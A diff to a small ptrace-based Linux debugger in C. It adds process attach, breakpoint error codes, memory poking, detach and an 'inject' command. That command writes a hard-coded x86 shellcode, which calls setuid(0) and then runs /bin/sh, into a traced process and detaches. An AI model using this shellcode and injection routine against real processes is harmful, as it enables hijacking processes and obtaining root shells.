@@ -54,6 +54,10 @@
 
 
 static bp_t g_bp;
+char g_shellcode[BUF_LEN] =       /* Standard */
+    "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46"
+    "\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
+    "\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
 
 
 /* Print prefix "dWbugger > " before we input cmd */
@@ -64,11 +68,22 @@ int disass_single (pid_t cpid, uint32_t addr); /* Single instruction */
 int parse_cmd (uint8_t *buf, int *len);   /* Parse input command */
 /* Peek memory */
 int peek_m (pid_t pid, uint32_t addr, uint8_t *buf, int *len);
+int poke_m (pid_t pid, uint32_t addr, uint8_t *buf, int *len);
 /* Peek register */
 int peek_r (pid_t pid, uint32_t addr, uint8_t *buf, int *len);
 int debug (pid_t cpid);
 int insert_bp (pid_t cpid, uint32_t addr, bp_t *); /* Insert breakpoint */
+
+/* error vaule handle_bp will return */
+#define BP_ERR_NOT_EXIT	-1      /* breakpoint is not exit */
+#define BP_ERR_NOT_MATCH -2     /* breakpoint's addr is not match eip */
+#define BP_ERR_RESTORE -3       /* Can't restore memory vaule */
+
 int handle_bp (pid_t cpid, bp_t); /* Handle breakpoint */
+
+int set_shellcode (char* buf, int len); /* Store user's shellcode */
+int inject_shellcode (pid_t cpid, uint32_t addr); /* Inject shellcode to
+                                                   * ($esp - 1024) or addr */
 
 
 int main (int argc, char **argv)
@@ -86,14 +101,28 @@ int main (int argc, char **argv)
     }
 
     if (!strncmp (argv[1], "-h", strlen ("-h"))
-        || !strncmp (argv[1], "--help", strlen ("-h"))) {
+        || !strncmp (argv[1], "--help", strlen ("--help"))) {
         print_help ();
-        exit (0);
+        exit (-1);
+    } else if (!strncmp (argv[1], "--attach", strlen ("--attach"))
+               && (3 == argc)) {
+        if ((pid = atoi (argv[2])) <= 0) {
+            printf ("Invalid pid\n");
+            exit (-1);
+        }
+
+        if (-1 == ptrace (PTRACE_ATTACH, pid, 0, 0)) {
+            perror ("Attach");
+            exit (-2);
+        }
+
+        goto begin_debug;
     }
+
     
     /* Fork */
-    switch ((pid = fork ()) < 0) {
-        printf ("fork err");
+    if ((pid = fork ()) < 0) {
+        perror ("fork");
         exit (1);
     }
 
@@ -114,14 +143,16 @@ int main (int argc, char **argv)
         ptrace (PTRACE_TRACEME, 0, 0, 0);
 		
 		execv (argv[1], args_array);
+        perror ("execl");
         
-        printf ("execl err\n");
         kill (getppid (), SIGKILL);
         exit (1);
     }
 
-    printf ("DarkWorld's debugger. http://\n");
+begin_debug:
 
+    printf ("DarkWorld's debugger. http://\n");
+    
     /* Start to debug */
     debug(pid);
 
@@ -130,11 +161,8 @@ int main (int argc, char **argv)
 
 int debug (pid_t cpid)
 {
- 
-#define BUF_LEN		1024
- 
     int status, print_len, is_continue = TRUE;
-    int buf_len;
+    int buf_len, poke_len, ret;
     uint8_t buf[BUF_LEN];
     struct user_regs_struct regs;
     poke_t poke;
@@ -169,7 +197,8 @@ int debug (pid_t cpid)
 #define CMD_DISASS_SINGLE	9	/* Disassebly-single instruction */
 #define CMD_UNSPPORTED	10
 #define CMD_HELP		11
-
+#define CMD_INJECT_SHELLCODE 12
+#define CMD_DETACH		13
 
         buf_len = BUF_LEN;
         
@@ -197,15 +226,26 @@ int debug (pid_t cpid)
             break;
 
         case CMD_CONTINUE:
+        cmd_continue:
             ptrace (PTRACE_CONT, cpid, 0, 0);
             wait (&status);
             if (WIFEXITED(status)) {
                 printf ("Program exits normally\n\n");
                 break;
             } else if (WIFSTOPPED (status)) {
-                if (handle_bp (cpid, g_bp) < 0)
-                    printf ("Failed to handle breakpoint 0x%08X\n", g_bp.addr);
-                else disass_single (cpid, g_bp.addr);
+                ret = handle_bp (cpid, g_bp);
+                switch (ret) {
+                case BP_ERR_RESTORE:
+                    printf ("Failed to restore data in breakpoint 0x%08X\n",
+                            g_bp.addr);
+                    break;
+                case BP_ERR_NOT_MATCH:
+                case BP_ERR_NOT_EXIT:
+                    goto cmd_continue;
+                    break;
+                default:
+                    disass_single (cpid, g_bp.addr);
+                }
             }
             break;
 
@@ -294,8 +334,8 @@ int debug (pid_t cpid)
                         "ebx: 0x%08lX\n"
                         "ecx: 0x%08lX\n"
                         "edx: 0x%08lX\n"
-                        "esi: 0x%08lX\n"
                         "edi: 0x%08lX\n"
+                        "esi: 0x%08lX\n"
                         "xds: 0x%08lX\n"
                         "xes: 0x%08lX\n"
                         "xfs: 0x%08lX\n"
@@ -305,7 +345,7 @@ int debug (pid_t cpid)
                         "eflags: 0x%08lX\n"
                         "orig_eax: 0x%08lX\n",
                         regs.eip, regs.esp, regs.ebp, regs.eax, regs.ebx,
-                        regs.ecx, regs.edx, regs.esi, regs.edi, regs.xds,
+                        regs.ecx, regs.edx, regs.edi, regs.esi, regs.xds,
                         regs.xes, regs.xfs, regs.xgs, regs.xcs, regs.xss,
                         regs.eflags, regs.orig_eax);
             } else if (!strncmp (peek.reg, "$esp", strlen ("$esp")))
@@ -346,6 +386,35 @@ int debug (pid_t cpid)
 
             if (-1 == ptrace (PTRACE_SETREGS, cpid, NULL, &regs))
                 printf ("Failed to alter register\n");            
+            break;
+
+        case CMD_INJECT_SHELLCODE:
+            if ((poke_len = strlen (g_shellcode)) <= 0) {
+                printf ("No shellcode\n");
+                break;
+            }
+
+            if (0 == *(uint32_t*)buf) {
+                ptrace (PTRACE_GETREGS, cpid, NULL, &regs);
+                *(uint32_t*)buf = (uint32_t) regs.esp - 1024;
+            }
+            
+            if (-1 == poke_m (cpid, *(uint32_t*)buf, (uint8_t*) g_shellcode,
+                              &poke_len)) {
+                printf ("Failed to inject shellcode\n");
+                break;
+            }
+            printf ("Suceed to inject shellcode\n");
+
+            ptrace (PTRACE_DETACH, cpid, 0, 0);
+            printf ("Detach now\n");
+            
+            break;
+            
+
+        case CMD_DETACH:
+            if (-1 == ptrace (PTRACE_DETACH, cpid, 0, 0))
+                perror ("detach");
             break;
 
         default:
@@ -399,6 +468,19 @@ int parse_cmd (uint8_t *buf, int *len)
         }
         return cmd;
 
+        /* Inject shellcode */
+    } else if (0 == strncmp (para, "inject", strlen ("inject"))) {
+            para = strtok (NULL, split);
+            if (para) {
+                if (0 == (*(uint32_t*)buf = strtoul (para, NULL, 0))) {
+                    printf ("Invalid address\n");
+                    return CMD_ERR;
+                }
+            } else
+                *(uint32_t*)buf = 0;
+            
+            return CMD_INJECT_SHELLCODE;
+
         /* Continue */
     } else if ((!strncmp (para, "c", strlen("c")))
                || (!strncmp (para, "continue", strlen("continue")))) {
@@ -414,6 +496,9 @@ int parse_cmd (uint8_t *buf, int *len)
     } else if (!strncmp (para, "q", strlen("q"))){
         cmd = CMD_QUIT;
         return cmd;
+
+    } else if (!strncmp (para, "detach", strlen("detach"))){
+        return CMD_DETACH;
         
         /* Set breakpoint */
     } else if (!strncmp (para, "b", strlen("b"))
@@ -566,7 +651,6 @@ print_insn_loop:
 
     /* Get raw data of instruction from addr */
     if (peek_m (cpid, start_addr, raw_data, &data_len) < 0) {
-        printf ("Failed to read memory\n");
         return -1;
     }		
 
@@ -749,12 +833,12 @@ int handle_bp (pid_t cpid, bp_t bp)
     struct user_regs_struct reg;
 
     if (bp.is_fresh != TRUE)
-        return -1;
+        return BP_ERR_NOT_EXIT;
 
     /* Restore reg.eip */
     ptrace (PTRACE_GETREGS, cpid, NULL, &reg);
     if (bp.addr != reg.eip-1)   /* They're not matched. */
-        return 0;
+        return BP_ERR_NOT_MATCH;
 
     printf ("Stopped by breatpoint 0x%08X\n", bp.addr);
     
@@ -763,11 +847,36 @@ int handle_bp (pid_t cpid, bp_t bp)
     /* Restore data and eip */
     if ((ptrace (PTRACE_SETREGS, cpid, NULL, &reg) == -1)
         || (ptrace (PTRACE_POKEDATA, cpid, bp.addr, bp.orig_data) == -1)) {
-        return -1;
+        return BP_ERR_RESTORE;
     }
     
     /* This breakpoint has been used now */
     bp.is_fresh = FALSE;
+
+    return 0;
+}
+
+
+int shellcode (char* buf, int len)
+{
+    
+    return 0;
+}
+
+int poke_m (pid_t pid, uint32_t addr, uint8_t *buf, int *len)
+{
+    int poke_len = 0;
+
+    while (poke_len < *len) {
+        if (-1 == ptrace (PTRACE_POKEDATA, pid, addr + poke_len,
+                          *(uint32_t*)(buf + poke_len))) {
+            perror ("Pokedata");
+            return -1;
+        }
+        poke_len += 4;
+    }
+         
+    *len = poke_len;
 
     return 0;
 }
